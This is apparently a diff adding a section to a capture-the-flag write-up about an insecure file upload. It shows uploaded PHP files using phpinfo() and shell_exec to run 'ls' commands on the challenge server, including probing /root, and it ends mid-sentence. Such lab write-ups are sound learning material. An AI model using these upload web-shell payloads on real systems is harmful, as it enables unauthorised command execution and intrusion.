@@ -60,3 +60,47 @@ Sending the following file and navigating to its path in the url...:
 
 This shows that its possible to get new HTML and Javascript onto the server via the file upload.
 
+<h2>Exploring remote execution</h2>
+
+After some further experimentation, I created a .php file with the code `<?php phpinfo(); ?>`. When I then navigated to that page on the server, many details about the installation were revealed. Some interesting ones have been noted below:
+
+`System 	Linux challenge 6.8.0-1024-aws #26-Ubuntu SMP Tue Feb 18 17:22:37 UTC 2025 x86_64 `
+`PHP API 	20190902`
+`Apache Version 	Apache/2.4.54 (Debian)`
+`Server Administrator 	webmaster@localhost`
+`Server Root 	/etc/apache2`
+`PHP Version 	7.4.33`
+`cURL support 	enabled`
+`cURL Information 	7.74.0`
+`PWD 	/challenge`
+
+From https://www.php.net/manual/en/function.shell-exec.php I took an example for shell execution code and modified it to show all files in an active directory.
+Sending:
+```
+<?php
+$output = shell_exec('ls -la');
+echo "<pre>$output</pre>";
+?>
+```
+- returns: 
+![image](https://github.com/user-attachments/assets/af4ae45e-da96-4134-ae48-688baec353a1)
+
+It seems that, I can execute shell code, and see list the files in the current directory.
+
+I wasn't able to shift directories via cd, but instead I can change the ls command to different directory using this payload
+```
+<?php
+$output = shell_exec('ls /root -l');
+echo "<pre>$output</pre>";
+?>
+```
+However, this returns a blank page, how interesting...
+
+with only specify the / directory, I can see the file structure for the machine:
+![image](https://github.com/user-attachments/assets/543f62ec-0f89-440f-86e3-709b57bde680)
+
+When sending the this command with `ls -la` command, we can see the priviliges for the different directories, notice that root 
+
+
+
+
